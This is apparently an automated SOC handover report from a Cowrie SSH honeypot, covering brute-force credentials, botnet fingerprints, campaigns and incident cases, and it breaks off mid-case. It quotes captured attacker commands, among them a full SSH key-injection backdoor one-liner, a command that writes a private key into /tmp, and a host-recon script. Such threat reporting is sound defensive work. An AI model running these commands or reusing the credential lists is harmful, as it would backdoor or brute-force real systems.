# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T22:26:36Z |
| **Shift Time** | 22:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **276** |
| Confirmed Threats | **253** |
| False Positives Filtered | **23** (8.3%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **36** |
| High Severity Cases | **146** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **130** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **167** |
| Unique Credential Pairs | **114** |
| Unique Usernames | **17** |
| Unique Passwords | **79** |
| Successful Auth Pairs | **154** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 39 |
| `admin` | 29 |
| `unknown` | 22 |
| `administrator` | 15 |
| `ubnt` | 14 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `159753` | 6 |
| `unknown2001` | 6 |
| `ubnt2011` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `unknown` | `159753` | 6 |
| `unknown` | `unknown2001` | 6 |
| `ubnt` | `ubnt2011` | 6 |
| `unknown` | `letmein` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `Admin` | `77.90.185.20` | 2026-08-23T18:55:48 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-08-23T18:56:58 |
| `root` | `password` | `92.118.39.14` | 2026-08-23T18:58:55 |
| `unknown` | `letmein` | `10.0.0.73` | 2026-08-23T18:59:23 |
| `ubuntu` | `user2@2024` | `217.60.255.130` | 2026-08-23T19:00:32 |
| `root` | `Basis@123` | `217.60.255.130` | 2026-08-23T19:00:36 |
| `root` | `password1` | `92.118.39.14` | 2026-08-23T19:00:53 |
| `root` | `qwerty` | `92.118.39.14` | 2026-08-23T19:02:53 |
| `ubnt` | `ubnt2020` | `187.93.68.178` | 2026-08-23T19:03:11 |
| `ubnt` | `ubnt2020` | `122.160.50.155` | 2026-08-23T19:03:20 |
| `root` | `welcome` | `92.118.39.14` | 2026-08-23T19:04:49 |
| `root` | `` | `94.154.43.196` | 2026-08-23T19:05:12 |
| `user` | `user2003` | `49.124.147.102` | 2026-08-23T19:05:41 |
| `user` | `user2003` | `182.75.234.236` | 2026-08-23T19:05:51 |
| `admin` | `000000` | `92.118.39.14` | 2026-08-23T19:06:50 |
| `admin` | `111111` | `92.118.39.14` | 2026-08-23T19:08:58 |
| `ubuntu` | `Allen@123` | `217.60.255.130` | 2026-08-23T19:10:11 |
| `root` | `Limited@123` | `217.60.255.130` | 2026-08-23T19:10:14 |
| `blank` | `blank2001` | `178.178.222.50` | 2026-08-23T19:10:36 |
| `blank` | `blank2001` | `92.251.124.73` | 2026-08-23T19:10:43 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T19:10:51 |
| `admin` | `123` | `92.118.39.14` | 2026-08-23T19:10:52 |
| `admin` | `123123` | `92.118.39.14` | 2026-08-23T19:12:45 |
| `admin` | `123321` | `92.118.39.14` | 2026-08-23T19:14:43 |
| `unknown` | `letmein` | `60.174.39.82` | 2026-08-23T19:16:39 |
| `admin` | `1234` | `92.118.39.14` | 2026-08-23T19:16:41 |
| `unknown` | `letmein` | `111.70.32.179` | 2026-08-23T19:16:51 |
| `unknown` | `letmein` | `201.28.237.90` | 2026-08-23T19:17:00 |
| `ubnt` | `ubnt2003` | `10.0.0.73` | 2026-08-23T19:18:32 |
| `admin` | `12345` | `92.118.39.14` | 2026-08-23T19:18:34 |
| `ubuntu` | `admin@12` | `217.60.255.130` | 2026-08-23T19:19:40 |
| `root` | `Ocean@123` | `217.60.255.130` | 2026-08-23T19:19:44 |
| `ubnt` | `ubnt2003` | `49.124.132.6` | 2026-08-23T19:20:08 |
| `ubnt` | `ubnt2003` | `27.39.130.144` | 2026-08-23T19:20:16 |
| `admin` | `123456` | `92.118.39.14` | 2026-08-23T19:20:39 |
| `blank` | `blank2001` | `10.0.0.73` | 2026-08-23T19:21:19 |
| `admin` | `1234567` | `92.118.39.14` | 2026-08-23T19:22:26 |
| `admin` | `12345678` | `92.118.39.14` | 2026-08-23T19:24:11 |
| `ob` | `ob` | `118.145.237.236` | 2026-08-23T19:25:15 |
| `admin` | `123456789` | `92.118.39.14` | 2026-08-23T19:26:01 |
| `root` | `P@ssw0rd01` | `118.193.39.103` | 2026-08-23T19:27:13 |
| `345gs5662d34` | `345gs5662d34` | `118.193.39.103` | 2026-08-23T19:27:17 |
| `root` | `3245gs5662d34` | `118.193.39.103` | 2026-08-23T19:27:18 |
| `admin` | `1234567890` | `92.118.39.14` | 2026-08-23T19:28:01 |
| `ubuntu` | `Black@123` | `217.60.255.130` | 2026-08-23T19:29:18 |
| `root` | `Sundar@123` | `217.60.255.130` | 2026-08-23T19:29:22 |
| `admin` | `123456a` | `92.118.39.14` | 2026-08-23T19:30:00 |
| `user` | `Admin123` | `139.59.208.49` | 2026-08-23T19:30:06 |
| `345gs5662d34` | `345gs5662d34` | `139.59.208.49` | 2026-08-23T19:30:08 |
| `user` | `3245gs5662d34` | `139.59.208.49` | 2026-08-23T19:30:09 |
| `real` | `real` | `57.129.47.135` | 2026-08-23T19:30:12 |
| `345gs5662d34` | `345gs5662d34` | `57.129.47.135` | 2026-08-23T19:30:15 |
| `real` | `3245gs5662d34` | `57.129.47.135` | 2026-08-23T19:30:15 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-23T19:30:48 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-23T19:30:48 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-23T19:30:49 |
| `unknown` | `159753` | `10.0.0.73` | 2026-08-23T19:31:14 |
| `admin` | `123qwe` | `92.118.39.14` | 2026-08-23T19:32:00 |
| `admin` | `1q2w3e4r` | `92.118.39.14` | 2026-08-23T19:34:02 |
| `root` | `Gr123456@` | `163.7.1.218` | 2026-08-23T19:35:37 |
| `345gs5662d34` | `345gs5662d34` | `163.7.1.218` | 2026-08-23T19:35:41 |
| `root` | `3245gs5662d34` | `163.7.1.218` | 2026-08-23T19:35:43 |
| `admin` | `654321` | `92.118.39.14` | 2026-08-23T19:35:49 |
| `admin` | `7777777` | `92.118.39.14` | 2026-08-23T19:37:33 |
| `blank` | `blank2001` | `203.75.170.63` | 2026-08-23T19:37:34 |
| `ubuntu` | `kafka@1234` | `217.60.255.130` | 2026-08-23T19:38:49 |
| `root` | `Password@1` | `217.60.255.130` | 2026-08-23T19:38:53 |
| `admin` | `abc123` | `92.118.39.14` | 2026-08-23T19:39:21 |
| `admin` | `admin` | `92.118.39.14` | 2026-08-23T19:41:16 |
| `nobody` | `nobody2009` | `66.175.138.122` | 2026-08-23T19:42:19 |
| `nobody` | `nobody2009` | `103.111.6.121` | 2026-08-23T19:42:27 |
| `admin` | `admin123` | `92.118.39.14` | 2026-08-23T19:43:11 |
| `admin` | `passw0rd` | `92.118.39.14` | 2026-08-23T19:45:06 |
| `admin` | `password` | `92.118.39.14` | 2026-08-23T19:47:07 |
| `ubuntu` | `lokesh@123` | `217.60.255.130` | 2026-08-23T19:48:26 |
| `root` | `Rashmi@123` | `217.60.255.130` | 2026-08-23T19:48:30 |
| `unknown` | `159753` | `1.212.225.99` | 2026-08-23T19:48:31 |
| `unknown` | `159753` | `36.153.164.122` | 2026-08-23T19:48:44 |
| `unknown` | `159753` | `112.78.177.237` | 2026-08-23T19:48:45 |
| `unknown` | `159753` | `101.13.3.207` | 2026-08-23T19:48:53 |
| `admin` | `password1` | `92.118.39.14` | 2026-08-23T19:49:03 |
| `unknown` | `unknown2001` | `10.0.0.73` | 2026-08-23T19:50:58 |
| `admin` | `qwerty` | `92.118.39.14` | 2026-08-23T19:51:00 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T19:51:36 |
| `unknown` | `unknown2001` | `153.37.177.219` | 2026-08-23T19:52:28 |
| `test12` | `1234` | `182.71.135.110` | 2026-08-23T19:52:32 |
| `louise` | `louise` | `138.124.158.150` | 2026-08-23T19:52:36 |
| `unknown` | `unknown2001` | `222.76.248.54` | 2026-08-23T19:52:38 |
| `345gs5662d34` | `345gs5662d34` | `182.71.135.110` | 2026-08-23T19:52:38 |
| `345gs5662d34` | `345gs5662d34` | `138.124.158.150` | 2026-08-23T19:52:39 |
| `louise` | `3245gs5662d34` | `138.124.158.150` | 2026-08-23T19:52:40 |
| `test12` | `3245gs5662d34` | `182.71.135.110` | 2026-08-23T19:52:41 |
| `administrator` | `123` | `92.118.39.14` | 2026-08-23T19:52:53 |
| `administrator` | `123123` | `92.118.39.14` | 2026-08-23T19:54:41 |
| `administrator` | `1234` | `92.118.39.14` | 2026-08-23T19:56:26 |
| `ubuntu` | `openvpn@123` | `217.60.255.130` | 2026-08-23T19:57:55 |
| `root` | `Qwerty@1234` | `217.60.255.130` | 2026-08-23T19:57:59 |
| `administrator` | `12345` | `92.118.39.14` | 2026-08-23T19:58:12 |
| `administrator` | `123456` | `92.118.39.14` | 2026-08-23T19:59:57 |
| `administrator` | `1234567` | `92.118.39.14` | 2026-08-23T20:01:44 |
| `administrator` | `12345678` | `92.118.39.14` | 2026-08-23T20:03:26 |
| `administrator` | `123456789` | `92.118.39.14` | 2026-08-23T20:05:08 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-23T20:06:47 |
| `administrator` | `123abc` | `92.118.39.14` | 2026-08-23T20:06:51 |
| `ubuntu` | `u@123` | `217.60.255.130` | 2026-08-23T20:07:31 |
| `root` | `Life@123` | `217.60.255.130` | 2026-08-23T20:07:35 |
| `unknown` | `unknown2001` | `65.20.158.10` | 2026-08-23T20:07:51 |
| `unknown` | `unknown2001` | `1.212.225.99` | 2026-08-23T20:08:04 |
| `administrator` | `1q2w3e4r` | `92.118.39.14` | 2026-08-23T20:08:36 |
| `nobody` | `nobody2009` | `104.248.83.99` | 2026-08-23T20:09:06 |
| `nobody` | `nobody2009` | `62.97.214.11` | 2026-08-23T20:09:13 |
| `administrator` | `abc123` | `92.118.39.14` | 2026-08-23T20:10:21 |
| `administrator` | `admin` | `92.118.39.14` | 2026-08-23T20:12:08 |
| `administrator` | `admin123` | `92.118.39.14` | 2026-08-23T20:13:56 |
| `administrator` | `passw0rd` | `92.118.39.14` | 2026-08-23T20:15:40 |
| `ubuntu` | `1Qaz2wsx3e` | `217.60.255.130` | 2026-08-23T20:17:03 |
| `root` | `Sonu@1234` | `217.60.255.130` | 2026-08-23T20:17:05 |
| `administrator` | `password` | `92.118.39.14` | 2026-08-23T20:17:25 |
| `debian` | `000000` | `92.118.39.14` | 2026-08-23T20:19:08 |
| `ubnt` | `ubnt2007` | `201.163.73.88` | 2026-08-23T20:20:28 |
| `ubnt` | `ubnt2007` | `112.78.177.237` | 2026-08-23T20:20:36 |
| `ubnt` | `ubnt2011` | `10.0.0.73` | 2026-08-23T20:23:18 |
| `ubnt` | `ubnt2011` | `111.70.23.238` | 2026-08-23T20:24:41 |
| `ubnt` | `ubnt2011` | `223.99.212.58` | 2026-08-23T20:24:51 |
| `debian` | `debian2000` | `10.0.0.73` | 2026-08-23T20:25:03 |
| `ubuntu` | `Password@1234` | `217.60.255.130` | 2026-08-23T20:26:39 |
| `root` | `Thane@2025` | `217.60.255.130` | 2026-08-23T20:26:43 |
| `root` | `!root` | `92.118.39.71` | 2026-08-23T20:32:32 |
| `root` | `111111` | `92.118.39.71` | 2026-08-23T20:34:17 |
| `unknown` | `p@ssword` | `10.0.0.73` | 2026-08-23T20:34:55 |
| `ubuntu` | `vps@2025` | `217.60.255.130` | 2026-08-23T20:36:07 |
| `root` | `Rama@1234` | `217.60.255.130` | 2026-08-23T20:36:11 |
| `root` | `123123` | `92.118.39.71` | 2026-08-23T20:36:13 |
| `root` | `123321` | `92.118.39.71` | 2026-08-23T20:38:17 |
| `ubnt` | `ubnt2011` | `36.64.36.101` | 2026-08-23T20:40:15 |
| `ubnt` | `ubnt2011` | `87.225.108.138` | 2026-08-23T20:40:23 |
| `root` | `1234` | `92.118.39.71` | 2026-08-23T20:40:23 |
| `debian` | `debian2000` | `176.204.246.72` | 2026-08-23T20:41:30 |
| `debian` | `debian2000` | `60.173.105.206` | 2026-08-23T20:41:39 |
| `root` | `12345` | `92.118.39.71` | 2026-08-23T20:42:29 |
| `ubuntu` | `System@2025` | `217.60.255.130` | 2026-08-23T20:45:47 |
| `root` | `Cloud@123` | `217.60.255.130` | 2026-08-23T20:45:50 |
| `root` | `1234567` | `92.118.39.71` | 2026-08-23T20:46:06 |
| `config` | `config2008` | `113.108.144.34` | 2026-08-23T20:46:38 |
| `config` | `config2008` | `110.25.107.25` | 2026-08-23T20:46:46 |
| `root` | `12345678` | `92.118.39.71` | 2026-08-23T20:48:01 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-23T20:49:23 |
| `root` | `123456789` | `92.118.39.71` | 2026-08-23T20:49:53 |
| `root` | `1234567890` | `92.118.39.71` | 2026-08-23T20:51:45 |
| `unknown` | `p@ssword` | `201.28.176.31` | 2026-08-23T20:52:11 |
| `unknown` | `p@ssword` | `39.164.94.190` | 2026-08-23T20:52:24 |
| `unknown` | `p@ssword` | `180.248.62.53` | 2026-08-23T20:52:36 |
| `root` | `123456a` | `92.118.39.71` | 2026-08-23T20:53:43 |
| `admin` | `admin` | `94.154.43.183` | 2026-08-23T20:54:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **276** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 67 |
| libssh | 49 |
| OpenSSH | 37 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 57 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 37 | 35 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 16 | 6 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 57 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 37 | 35 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 16 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 56 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`, `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.196`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `163.7.1.218`, `57.129.47.135`, `118.193.39.103`, `182.71.135.110`, `138.124.158.150`, `139.59.208.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **68** |
| High-Risk ASNs | **54** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 2 | HIGH |
| `AS269931` | WIRELESS MULTI SERVICE VARGAS CABRERA, S. R. L | 2 | LOW |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS219502` | Storm Industries LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (146)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f4f5517f74c1

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-23 18:55 |
| **Last Seen** | 2026-08-23 18:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:55:39` | `cowrie.session.connect` |
| `2026-08-23 18:55:41` | `cowrie.client.version` |
| `2026-08-23 18:55:41` | `cowrie.client.kex` |
| `2026-08-23 18:55:48` | `cowrie.login.success` |
| `2026-08-23 18:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a165688b0714

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-23 18:55 |
| **Last Seen** | 2026-08-23 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:55:52` | `cowrie.session.connect` |
| `2026-08-23 18:55:52` | `cowrie.client.version` |
| `2026-08-23 18:55:52` | `cowrie.client.kex` |
| `2026-08-23 18:55:53` | `cowrie.login.success` |
| `2026-08-23 18:55:54` | `cowrie.session.params` |
| `2026-08-23 18:55:54` | `cowrie.command.input` |
| `2026-08-23 18:55:55` | `cowrie.session.file_download` |
| `2026-08-23 18:55:55` | `cowrie.session.file_download` |
| `2026-08-23 18:55:55` | `cowrie.log.closed` |
| `2026-08-23 18:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad994871532b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:56 |
| **Last Seen** | 2026-08-23 18:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:56:57` | `cowrie.session.connect` |
| `2026-08-23 18:56:57` | `cowrie.client.version` |
| `2026-08-23 18:56:57` | `cowrie.client.kex` |
| `2026-08-23 18:56:58` | `cowrie.login.success` |
| `2026-08-23 18:56:59` | `cowrie.session.params` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.success` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:56:59` | `cowrie.command.input` |
| `2026-08-23 18:57:00` | `cowrie.log.closed` |
| `2026-08-23 18:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6204a1f0a7c0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 18:58 |
| **Last Seen** | 2026-08-23 18:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 18:58:53` | `cowrie.session.connect` |
| `2026-08-23 18:58:53` | `cowrie.client.version` |
| `2026-08-23 18:58:54` | `cowrie.client.kex` |
| `2026-08-23 18:58:55` | `cowrie.login.success` |
| `2026-08-23 18:58:57` | `cowrie.session.params` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.success` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.command.input` |
| `2026-08-23 18:58:57` | `cowrie.log.closed` |
| `2026-08-23 18:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdbe2dc5ff65

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:00 |
| **Last Seen** | 2026-08-23 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:00:31` | `cowrie.session.connect` |
| `2026-08-23 19:00:31` | `cowrie.client.version` |
| `2026-08-23 19:00:31` | `cowrie.client.kex` |
| `2026-08-23 19:00:32` | `cowrie.login.success` |
| `2026-08-23 19:00:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:00:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:00:32` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74b607cb1027

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:00 |
| **Last Seen** | 2026-08-23 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:00:35` | `cowrie.session.connect` |
| `2026-08-23 19:00:35` | `cowrie.client.version` |
| `2026-08-23 19:00:35` | `cowrie.client.kex` |
| `2026-08-23 19:00:36` | `cowrie.login.success` |
| `2026-08-23 19:00:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:00:36` | `cowrie.direct-tcpip.ja4h` |
